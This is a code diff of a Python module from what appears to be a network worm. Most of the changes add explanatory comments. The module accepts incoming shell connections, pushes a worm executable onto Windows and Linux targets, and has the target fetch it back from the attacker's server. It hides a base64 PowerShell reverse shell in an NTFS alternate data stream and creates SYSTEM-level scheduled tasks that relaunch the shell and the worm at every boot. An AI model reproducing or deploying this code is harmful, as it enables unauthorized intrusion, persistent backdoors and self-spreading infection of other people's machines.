@@ -1,10 +1,10 @@
-import socket, threading
+import threading
 import time, select
-from replicate import replicate
 from deployment import deployment
 
 class tunnel(threading.Thread):
     
+    # initialize the tunnel class
     def __init__(self, worm, sock, lhost="0.0.0.0", lport=1337):
         self.worm = worm
         self.lhost = lhost
@@ -14,12 +14,18 @@ class tunnel(threading.Thread):
         self.connection = {}
         super().__init__()
     
-    
+    #start the thread process
     def run(self):
         try:
             print("accepting traffic on port {}".format(self.lport))
+
+            # wait for the incoming shell connection
             conn, addr = self.sock.accept()
+
+            # set timeout on the connection
             conn.settimeout(10)
+
+            #store the connection and address
             self.set_connection(conn,addr)
             print("Got a connection from: {}",addr)
             
@@ -28,18 +34,26 @@ class tunnel(threading.Thread):
                 dir = "C:/Users/Public/Documents"
             else:
                 dir = "/tmp/"
+            
+            # start to deploy virus process
             self.deploy_virus(self.worm.getfiledata(),conn, osplatform, dir)
+
+            # start to create persistence proces on windows
             self.create_persistence_windows(conn, osplatform, dir, filename="hello.txt")
+            
+            # close the connection
             conn.close()
+
         except TimeoutError:
-            return False
+            print("Timeout Error, Possbile on Infection Phrase. Terminate Current Tunnel")
     
     
+    # handles the send command between the attacker and the target
     def sent_command(self, command, conn):
         print(command)
         conn.send(command)
         time.sleep(2)
-        
+    
     def sent_large_command(self, command, conn):
         #print(command)
         total_sent = 0
@@ -49,7 +63,7 @@ class tunnel(threading.Thread):
                 raise RuntimeError("socket connection broken")
             total_sent = total_sent + sent
 
-        
+    # retrieve the response that the target send back
     def get_response(self,conn,size=1024):
         response = conn.recv(size).decode()
         return response
@@ -62,10 +76,11 @@ class tunnel(threading.Thread):
 
     def get_done(self):
         return self.complete
+
     # def delivery_virus(self, target_ip, virus):
     #     self.get_connection(target_ip).sendall(virus)
 
-
+    # generate a base64 bind shell
     def generate_base64_bind_shell_code(self, ostype:str):
         if ostype == "windows":
             bind_shell = ""
@@ -91,6 +106,7 @@ class tunnel(threading.Thread):
         else:
             return ""
 
+    # generate a base64 reverse shell
     def generate_base64_reverse_shell_code(self, ostype:str):
         print("Create a reverse Shell on Port 7777")
         if ostype == "windows":
@@ -114,37 +130,47 @@ class tunnel(threading.Thread):
             return ""
         else:
             return ""
+
+    #commands for create persistence on windows 10
     def create_persistence_windows(self, conn, ostype, dir,filename):
-        #creating a backdoor access on the remote server
+        #creating a backdoor access on the remote target, store the base64 code in alternative data stream
+        #generate the command
         command = 'Set-Content -path "{}/{}:hidden" -Value "'.format(dir,filename).encode()
         command += self.generate_base64_reverse_shell_code("windows").encode()
         command += b'"'
         command+=b"\n"
+
+        # send the command over
         self.sent_command(command,conn)
         print("Store Base64 Shell in {} Folder".format(dir))
         time.sleep(8)
         print(self.get_response(conn,4096))
         
+        #generate the a schedule task on system start. execute the reverse shell
         command = 'schtasks /create /tn "reminderr" /sc onstart /RL HIGHEST /RU "SYSTEM" /tr "powershell -Command \"`$command`=get-content {}/{}:hidden; powershell -encodedcommand `$command`\""'.format(dir,filename).encode()
         command+=b"\n"
+        
+        # send the command over
         self.sent_command(command,conn)
         print("Create a Schedule Tasks to Start the reverse Shell on Boot")
         print(self.get_response(conn,1024))
     
     def deploy_virus(self, data, conn, ostype="windows", dir=""):
-        #print(data)
+        #setup the worm ready - deployment socket connection
         server = deployment("0.0.0.0",8081,data)
         server.start()
         
+        #identify which operating system deploy to, and send corresponding commands over 
         if ostype=="windows":
             self.deploy_to_windows(conn, dir)
         else:
             self.deploy_to_linux(conn)
-            
-            
+
+    #deploy to windows system       
     def deploy_to_windows(self,conn, dir):
-        #start command sequence
+        #start command sequence, 
         try:
+            # commands for the target machine to reach back us for the worm
             print("Start Deploying worm to Windows")
             command = "cd {}".format(dir).encode()
             command+=b"\n"
@@ -175,12 +201,15 @@ class tunnel(threading.Thread):
             print("target machine is starting to connect to the us")
             print("Target Response: {}".format(self.get_response(conn,1024)))
             time.sleep(10)
+
             #Setup Self execute on startup
             command = 'schtasks /create /tn "scannerr" /sc onstart /RL HIGHEST /RU "SYSTEM" /tr "{}/{}_tworm.exe";'.format(dir,self.lhost).encode()
             command+=b"\n"
             self.sent_command(command,conn)
             time.sleep(3)
             tasks_response = self.get_response(conn,1024)
+
+            #check if the over the schedule tasks if the name alreay exists
             print("Target Response: {}".format(tasks_response))
             if "already exists" in tasks_response:
                 command = b'Y'
@@ -189,14 +218,12 @@ class tunnel(threading.Thread):
                 tasks_response = self.get_response(conn,1024)
             print("Target Response: {}".format(tasks_response))
             
-            #execute the worm
+            #execute the worm on the target machine
             command = "./{}_tworm.exe".format(self.lhost).encode()
             command+=b"\n"
             self.sent_command(command,conn)
             print("Target Response: {}".format(self.get_response(conn,1024)))
-            
-            
-            
+    
         except TimeoutError as t:
             print("no Response")
             
